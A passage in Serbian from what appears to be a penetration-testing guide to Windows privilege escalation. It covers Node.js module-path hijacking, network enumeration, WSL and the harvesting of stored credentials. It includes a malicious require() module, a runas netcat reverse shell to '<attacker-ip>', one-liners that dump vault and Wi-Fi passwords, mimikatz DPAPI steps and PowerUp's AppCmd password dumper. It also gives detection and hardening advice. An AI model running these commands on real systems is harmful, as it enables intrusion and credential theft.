for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking razrešavanja Node.js / Electron modula putem `C:\node_modules`

Ovo je varijanta **nekontrolisane putanje pretrage u Windows-u** koja utiče na aplikacije **Node.js** i **Electron** kada izvrše goli import kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node razrešava pakete tako što se kreće naviše kroz stablo direktorijuma i proverava fascikle `node_modules` u svakom roditeljskom direktorijumu. U Windows-u to kretanje može stići do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može pokušati da pronađe:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa to postaje **LPE** kad god se cilj pokreće kao administrator, iz zakazanog zadatka sa povišenim privilegijama / omotača servisa ili iz aplikacije za radnu površinu sa povišenim privilegijama koja se automatski pokreće.

Ovo je naročito često kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja sa radom u slučaju greške
- je paket uklonjen iz produkcionih build-ova, izostavljen tokom pakovanja ili nije uspeo da se instalira
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, umesto u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da biste potvrdili putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE Electron aplikacije ili proces omotača)
- Filtrirajte po `Path` koji `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje u `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Napravite root direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul pod tačno očekivanim nazivom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul nedostaje, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionalnih modula iz stvarnog sveta koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo upotrebiti: pronađite bilo koji **nedostajući bare import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` datoteke/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve runtime zavisnosti u pakete i proverite upotrebu `optionalDependencies`.
- Pregledajte kôd trećih strana u potrazi za obrascima `try { require("...") } catch {}` koji tiho ignorišu greške.
- Onemogućite opcionalne provere kada ih biblioteka podržava (na primer, neke `ws` instalacije mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su drugi poznati računari hardkodirano navedeni u hosts datoteci.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite **ograničene usluge** spolja.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i svim servisima ili zakazanim zadacima koji ga pokreću. Servis za daljinsko upravljanje može da omogući pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama predstavlja zaseban cilj za analizu: listener i putanja binarne datoteke pasivni su tragovi, dok putanja do iskorišćavanja ranjivosti korupcije memorije zahteva analizu konkretne binarne datoteke i ulaza koji joj je dostupan. Ako se čini da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite kojoj pozadinskoj usluzi pripada; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

[**Pogledajte ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(izlistavanje pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više [komandi za enumeraciju mreže nalazi se ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarna datoteka `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete slušati na bilo kom portu (kada prvi put upotrebite `nc.exe` za slušanje na portu, grafički interfejs će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite WSL sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windowsu. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, proverite datoteke sa istorijom shell-a (uključujući `/root/.bash_history`) i potražite komande u kojima su možda zabeleženi akreditivi; za eskalaciju su i dalje potrebni važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično čuva distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), pa najpre utvrdite stvarnu distribuciju i putanju skladišta. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog prikupljanja podataka.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Neprazna vrednost `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz lozinke u čistom tekstu u registru. Ako je `AutoAdminLogon=1`, ali nijedna lozinka u čistom tekstu nije čitljiva, to je samo naznaka: [Sysinternals Autologon može da čuva lozinku kao LSA tajnu](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registra ne utvrđuje da li ta tajna postoji niti da li se može preuzeti. Pre nego što prijavite izlaganje akreditiva, proverite prava pristupa i stvarnu konfiguraciju prijavljivanja.

### Credential Manager / Windows Vault

Preuzeto sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled može delovati kao da korisnici mogu da čuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da omoguće pregledačima automatsko prijavljivanje, ali to ne funkcioniše tako.

Windows Vault čuva akreditive koje Windows može automatski da koristi za prijavljivanje korisnika, što znači da svaka **Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault i da upotrebi dostavljene akreditive, umesto da korisnici svaki put unose korisničko ime i lozinku.

Osim ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za dati resurs. Dakle, ako vaša aplikacija želi da koristi trezor, trebalo bi nekako da **komunicira sa Credential Manager-om i zatraži akreditive za taj resurs** iz podrazumevanog trezora za skladištenje.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na računaru.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete da koristite `runas` sa opcijom `/savecred` da biste koristili sačuvane akreditive. Sledeći primer poziva udaljenu binarnu datoteku preko SMB deljenog resursa.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa prosleđenim akreditivima.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da se mogu koristiti mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderne sistemske usluge čuvaju autentifikacione tokene i plaintext lozinke unutar Universal Windows Platform (UWP) `PasswordVault` skladišta (dostupnog i kao `Web Credentials` u `vaultcmd`). Ovo skladište je izolovano po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu unutar aktivne sesije korisnika da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i plaintext lozinke:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, koji se pretežno koristi u operativnom sistemu Windows za simetrično šifrovanje privatnih asimetričnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu da bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisničkih tajni za prijavljivanje**. U slučajevima sistemskog šifrovanja, koristi tajne za autentifikaciju sistema na domenu.

Šifrovani korisnički RSA ključevi, zaštićeni DPAPI-jem, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se u istoj datoteci nalazi zajedno s glavnim ključem koji štiti korisnikove privatne ključeve**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa njegov sadržaj nije moguće prikazati pomoću komande `dir` u CMD-u, ali se može prikazati kroz PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa kredencijalima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da biste dešifrovali.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije kao praktičan način čuvanja šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju do `.xml` datoteke. Kada skripta ili inventar datoteka ukaže na jednu takvu datoteku, pronađite stvarnu putanju do profila naloga umesto da pretpostavite da se nalazi u `C:\Users`: [Windows može da smesti profile na druga mesta](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka samo je trag; [Windows `Export-Clixml` vezuje šifrovani akreditiv za korisnika i računar koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki oporavljeni nalog mora zasebno da ima važeća prava na predviđenom servisu. Najpre proverite putanje i ACL-ove, bez ispisivanja šifrovanih ili otvorenih vrednosti tokom rutinskog popisivanja.

Da biste **dešifrovali** PowerShell akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač akreditivima za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul Mimikatz `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnoge DPAPI masterkey vrednosti** iz memorije pomoću modula Mimikatz `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište konekcija.** Pregledajte čitljiv XML u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke sa uobičajenim nazivima kao što je `config.xml`. Utvrdite šemu konekcija i šifrovane atribute `Password` pre nego što XML datoteku smatrate tragom do kredencijala. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opsežnog pregleda.

**Izvozi profila Remote Desktop Plus** mogu biti čitljivi i u korisničkim fasciklama ili zajedničkoj administrativnoj fascikli. Zastareli izvoz `profiles.xml` sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Tretirajte element lozinke koji nije prazan kao trag do kredencijala, bez ispisivanja njegove vrednosti ili pretpostavke da je u otvorenom tekstu: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojem je profil napravljen ili podešena manje strogo. Pre nego što se oslonite na nju, potvrdite poreklo datoteke i uslove za oporavak.

### Sticky Notes

Ljudi često koriste aplikaciju Sticky Notes na Windows radnim stanicama da bi **sačuvali lozinke** i druge informacije, ne shvatajući da je reč o datoteci baze podataka. Ova datoteka se nalazi na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek je vredi potražiti i pregledati.

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili druge aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladišta koristi pre nego što odsustvo SQLite datoteke protumačite kao odsustvo beleški.

Ako Sticky Notes koristi SQLite zapisivanje unapred (WAL), kopija datoteke `plum.sqlite` može izostaviti nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` uz usklađenu kopiju baze podataka i uključite `plum.sqlite-shm` ako je dostupna; indeks zajedničke memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite dokumentaciju o WAL-u](https://www.sqlite.org/wal.html). Beleška koja sadrži naziv naloga ili lozinku samo je trag do kredencijala: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Za zapis šifrovanog menadžera lozinki potrebni su i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi se na osnovu njega potvrdila prijava sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da morate biti Administrator i pokrenuti proces na nivou High Integrity da biste oporavili lozinke iz AppCmd.exe.**\
**AppCmd.exe** se nalazi u fascikli `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **kredencijali** koji se mogu **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalateri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije iz** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i Registry (akreditivi)

### Artefakti akreditiva u Registry-ju alata za podršku

Neke starije instalacije alata za udaljenu podršku zadržavaju nazive vrednosti povezane s lozinkom u fiksnim ključevima Registry-ja aplikacije. Na primer, `SecurityPasswordAES` u TeamViewer-u označavao je konfigurisanu statičku lozinku sesije u verzijama pre verzije 9, prema [objašnjenju proizvođača o ključu Registry-ja](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Oznaka u nazivu vrednosti samo je smernica za proveru: utvrdite instaliranu verziju, da li su podaci vrednosti čitljivi, njihov format i trenutno ponašanje autentifikacije pre nego što procenite taj akreditiv. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke i ovlašćenje za taj nalog. Šifrat i oporavljene lozinke držite van izlaza rutinske enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita lista kontroliše uređivanje i nije bezbednosna funkcija; sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene i relevantne datoteke i izbegavajte ispisivanje potencijalnih tajni tokom opsežne enumeracije. Čitljiva putanja do `.xlsx` datoteke, zaštićen list ili skrivena kolona sami po sebi ne dokazuju da akreditivi postoje niti da bilo koji nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Zadržane izmene zakrpa CI servera

CI server može zadržati poslate izmene izvornog koda u svom direktorijumu sa podacima i nakon završetka izgradnje. [TeamCity navodi](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) da se `system/changes` koristi za čuvanje izmena iz udaljenih pokretanja; direktorijum sa podacima može se konfigurisati i ne mora biti unutar `ProgramData`. Čitljiva zakrpa može sačuvati uklonjene ili dodate reference na datoteku akreditiva, ključ za šifrovanje ili skriptu koja koristi oba. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva AES ključ kao i šifrovani niz; [Microsoft navodi](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim, uz ovlašćenje, pregledajte relevantan sadržaj bez ispisivanja tajni u izlazu rutinske enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju postojanje važećeg akreditiva niti pristup sa većim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene za izgradnju.

### Prilagođeno rotiranje lozinke lokalnog administratora

Domaći alat za rotiranje lozinki može čuvati šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, a akreditive za skladište podataka u čitljivoj `.env` datoteci ili pored binarne datoteke programa za ažuriranje. Zajedno proverite zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole za skladište podataka. Skladište podataka dostupno samo preko loopback interfejsa i dalje je dostupno lokalnom korisniku koji ima važeće akreditive, ali sama autentifikacija ne dokazuje da korisnik ima dozvolu za čitanje relevantnih zapisa. Ako su seed ili ključni materijal za šifrovanje dostupni pored šifrata, proverite tačan način izvođenja ključa pre nego što se oslonite na šifrovanje. Šema koja deterministički izvodi AES ključ iz izloženog seeda pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije pogodna za zaštitu te lozinke; Go navodi da taj paket nije prikladan za slučajnost osetljivu sa stanovišta bezbednosti. Pre nego što oporavljenu lozinku smatrate putem za eskalaciju, potvrdite da je važeća i da pripada nalogu iz lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` datoteke ili šifrovani blob sami po sebi ne dokazuju nijedan od tih uslova. Lozinke i ključni materijal držite van izlaza rutinske enumeracije.

Koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) za upravljanje lozinkama lokalnog administratora. Njegovo skladištenje u direktorijumu ili iza Entra sistema i kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [Elasticsearch uloge](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba akreditiva

Neki dodaci za Java servere distribuiraju se kao JAR arhive u direktorijumu `plugins` servera. Čitljiv prilagođeni dodatak može sadržati konfiguraciju ili bytecode sa ugrađenim akreditivom usluge. Arhivu pregledajte samo uz ovlašćenje, a oporavljene tajne držite van izlaza rutinske enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a oporavljena lozinka usluge vodi do većih privilegija samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove datoteka i zamenite ponovo korišćene akreditive različitim tajnama. Pogledajte [PaperMC vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [Oracle JAR dokumentaciju](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhiva.

### Akreditivi ugrađene baze podataka Openfire-a

Openfire instalacija koja koristi ugrađenu bazu podataka može čuvati `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da ga čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire [dokumentacija o pružaocu korisničkih podataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu biti sačuvane u običnom tekstu ili šifrovane ključem koji se čuva u tom svojstvu. Oporavljena lozinka važna je za eskalaciju samo ako je još važeća za identitet sa većim privilegijama; samo ime datoteke ne dokazuje ni pristup za čitanje ni ponovnu upotrebu akreditiva. Putanja je samo smernica za inventarizaciju, zato sadržaj baze podataka i akreditive držite van izlaza rutinske enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može otkriti konfigurisane portove i interfejs za vezivanje administratorske konzole, čak i kada se koristi spoljna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback; lokalni nalog i dalje može da dođe do adrese ako listener radi. Zajedno proverite stvarni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može da izazove izvršavanje koda dodatka u kontekstu usluge, što može imati visoke privilegije kada se usluga izvršava kao LocalSystem. Podudarna lozinka naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte proizvođačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za digitalnu forenziku

